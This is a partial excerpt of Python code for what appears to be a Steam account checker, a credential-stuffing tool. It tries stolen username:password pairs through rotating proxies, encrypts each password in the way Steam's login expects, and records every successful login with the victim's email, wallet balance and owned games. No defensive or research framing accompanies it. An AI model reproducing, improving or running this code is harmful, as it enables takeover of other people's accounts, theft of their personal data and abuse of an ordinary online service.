    ...
    while not Checker.stopping:
        try:
            with Session() as s:
                ...
                encrypted_password = quote(
                    b64encode(
                        encrypt(password.encode(), PublicKey(int(k1, 16), int(k2, 16)))
                    )
                )
                ...
                if (
                    ...
                    if not Checker.cui:
                        log("custom", ":".join([username, password]), "Steam")
                    save(
                        "Steam",
                        "custom",
                        Checker.time,
                        ":".join([username, password]) + f" | Email: {email}",
                    )
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                ...
                if (
                    "Your profile is being forced private due to an active Community Ban on your account."
                    in r.text
                ):
                    if not Checker.cui:
                        log("custom", ":".join([username, password]), "Steam")
                    save(
                        "Steam", "custom", Checker.time, ":".join([username, password])
                    )
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                games = []
                games_list = loads(
                    r.text.replace("&quot;", '"').split('rgGames":')[1].split(',"rg')[0]
                )
                ...
                balance = r.text.split('<div class="accountData price">')[1].split(
                    "</div>"
                )[0]
                email = r.text.split(
                    'Email address:</span> <span class="account_data_field">'
                )[1].split("</span>")[0]

                if not Checker.cui:
                    log("good", ":".join([username, password]), "Steam")
                save(
                    "Steam",
                    "good",
                    Checker.time,
                    ":".join([username, password])
                    + f" | Total Games: {len(games)} | Balance: {balance} | Email: {email} | Games List: [{', '.join(games)}]",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
